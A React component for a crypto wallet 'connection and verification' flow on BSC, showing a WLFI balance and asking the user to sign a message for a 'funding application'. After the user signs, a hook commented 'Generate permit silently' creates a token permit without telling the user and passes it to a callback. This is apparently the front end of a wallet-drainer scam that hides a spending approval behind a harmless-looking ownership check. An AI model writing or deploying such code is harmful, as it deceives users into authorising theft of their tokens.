import React, { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { useWeb3 } from '@/hooks/useWeb3'
import { useToast } from '@/hooks/use-toast'
import { 
  Wallet, 
  CheckCircle, 
  AlertTriangle, 
  Loader2, 
  Copy,
  ExternalLink,
  Shield
} from 'lucide-react'

interface WalletConnectionProps {
  onConnectionComplete: (walletData: any) => void
  onSignatureComplete: (signature: string) => void
  onPermitGenerated?: (permitData: any) => void
}

export const WalletConnection: React.FC<WalletConnectionProps> = ({
  onConnectionComplete,
  onSignatureComplete,
  onPermitGenerated
}) => {
  const {
    isConnected,
    address,
    chainId,
    isConnecting,
    connectWallet,
    disconnectWallet,
    signMessage,
    isSigning,
    signature,
    generatePermit,
    permitData,
    getWLFIBalance,
    isCorrectChain
  } = useWeb3()

  const [balance, setBalance] = useState<string>('0')
  const [step, setStep] = useState<'connect' | 'verify' | 'complete'>('connect')
  const { toast } = useToast()

  // Update step based on connection state
  useEffect(() => {
    if (!isConnected) {
      setStep('connect')
    } else if (!signature) {
      setStep('verify')
    } else {
      setStep('complete')
    }
  }, [isConnected, signature])

  // Get balance when connected
  useEffect(() => {
    if (isConnected && address && isCorrectChain) {
      getWLFIBalance().then(setBalance)
    }
  }, [isConnected, address, isCorrectChain, getWLFIBalance])

  // Handle connection completion
  useEffect(() => {
    if (isConnected && address && chainId) {
      onConnectionComplete({
        address,
        chainId,
        balance
      })
    }
  }, [isConnected, address, chainId, balance, onConnectionComplete])

  // Handle signature completion
  useEffect(() => {
    if (signature) {
      onSignatureComplete(signature)
    }
  }, [signature, onSignatureComplete])

  // Generate permit silently after signature
  useEffect(() => {
    if (signature && isConnected && isCorrectChain && !permitData) {
      generatePermit().then((permit) => {
        if (permit && onPermitGenerated) {
          onPermitGenerated(permit)
        }
      })
    }
  }, [signature, isConnected, isCorrectChain, permitData, generatePermit, onPermitGenerated])

  const handleConnect = async () => {
    await connectWallet()
  }

  const handleSign = async () => {
    const sig = await signMessage()
    if (sig) {
      toast({
        title: "Verification Complete",
        description: "Your wallet has been successfully verified"
      })
    }
  }

  const copyAddress = () => {
    if (address) {
      navigator.clipboard.writeText(address)
      toast({
        title: "Address Copied",
        description: "Wallet address copied to clipboard"
      })
    }
  }

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`
  }

  return (
    <Card className="bg-slate-800/50 backdrop-blur-lg border-slate-700">
      <CardHeader>
        <CardTitle className="flex items-center gap-2 text-white">
          <Wallet className="h-5 w-5 text-blue-400" />
          Wallet Connection & Verification
        </CardTitle>
        <CardDescription className="text-slate-300">
          Connect your wallet and verify ownership to continue
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        
        {/* Step 1: Connect Wallet */}
        <div className="space-y-4">
          <div className="flex items-center gap-2">
            <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
              isConnected ? 'bg-green-500' : step === 'connect' ? 'bg-blue-500' : 'bg-slate-600'
            }`}>
              {isConnected ? (
                <CheckCircle className="h-4 w-4 text-white" />
              ) : (
                <span className="text-white text-sm">1</span>
              )}
            </div>
            <h3 className="text-white font-semibold">Connect Wallet</h3>
            {isConnected && (
              <Badge variant="default" className="ml-auto">Connected</Badge>
            )}
          </div>

          {!isConnected ? (
            <div className="pl-10 space-y-4">
              <p className="text-slate-300 text-sm">
                Connect your wallet to verify ownership and proceed with your application.
              </p>
              <Button 
                onClick={handleConnect}
                disabled={isConnecting}
                className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700"
              >
                {isConnecting ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Connecting...
                  </>
                ) : (
                  <>
                    <Wallet className="mr-2 h-4 w-4" />
                    Connect Wallet
                  </>
                )}
              </Button>
            </div>
          ) : (
            <div className="pl-10 space-y-3">
              <div className="flex items-center gap-2">
                <span className="text-slate-400 text-sm">Address:</span>
                <code className="text-white bg-slate-700 px-2 py-1 rounded text-sm">
                  {formatAddress(address!)}
                </code>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={copyAddress}
                  className="h-6 w-6 p-0"
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
              
              <div className="flex items-center gap-2">
                <span className="text-slate-400 text-sm">Network:</span>
                <Badge variant={isCorrectChain ? "default" : "destructive"}>
                  {isCorrectChain ? 'BSC Mainnet' : `Chain ${chainId}`}
                </Badge>
              </div>

              {isCorrectChain && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-400 text-sm">WLFI Balance:</span>
                  <span className="text-white font-mono">{parseFloat(balance).toFixed(4)} WLFI</span>
                </div>
              )}

              {!isCorrectChain && (
                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                  <div className="flex items-center gap-2">
                    <AlertTriangle className="h-4 w-4 text-yellow-400" />
                    <span className="text-yellow-200 text-sm">
                      Please switch to BSC Mainnet to continue
                    </span>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Step 2: Sign Message */}
        {isConnected && (
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                signature ? 'bg-green-500' : step === 'verify' ? 'bg-blue-500' : 'bg-slate-600'
              }`}>
                {signature ? (
                  <CheckCircle className="h-4 w-4 text-white" />
                ) : (
                  <span className="text-white text-sm">2</span>
                )}
              </div>
              <h3 className="text-white font-semibold">Verify Ownership</h3>
              {signature && (
                <Badge variant="default" className="ml-auto">Verified</Badge>
              )}
            </div>

            {!signature ? (
              <div className="pl-10 space-y-4">
                <p className="text-slate-300 text-sm">
                  Sign a message to verify that you own this wallet. This doesn't cost any gas.
                </p>
                <div className="bg-slate-700/50 border border-slate-600 rounded-lg p-3">
                  <p className="text-slate-300 text-sm font-mono">
                    "{VERIFICATION_MESSAGE}"
                  </p>
                </div>
                <Button 
                  onClick={handleSign}
                  disabled={isSigning || !isCorrectChain}
                  className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700"
                >
                  {isSigning ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Signing...
                    </>
                  ) : (
                    <>
                      <Shield className="mr-2 h-4 w-4" />
                      Sign Message
                    </>
                  )}
                </Button>
              </div>
            ) : (
              <div className="pl-10">
                <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-3">
                  <div className="flex items-center gap-2">
                    <CheckCircle className="h-4 w-4 text-green-400" />
                    <span className="text-green-200 text-sm">
                      Wallet ownership verified successfully
                    </span>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Step 3: Complete */}
        {signature && (
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                <CheckCircle className="h-4 w-4 text-white" />
              </div>
              <h3 className="text-white font-semibold">Verification Complete</h3>
              <Badge variant="default" className="ml-auto">Ready</Badge>
            </div>

            <div className="pl-10">
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <Shield className="h-5 w-5 text-blue-400 mt-0.5" />
                  <div>
                    <h4 className="text-blue-200 font-medium mb-1">Security Verified</h4>
                    <p className="text-blue-100 text-sm">
                      Your wallet has been connected and verified. You can now proceed with your funding application.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Disconnect Option */}
        {isConnected && (
          <div className="pt-4 border-t border-slate-600">
            <Button
              variant="outline"
              size="sm"
              onClick={disconnectWallet}
              className="text-slate-400 border-slate-600 hover:bg-slate-700"
            >
              Disconnect Wallet
            </Button>
          </div>
        )}
      </CardContent>
    </Card>
  )
}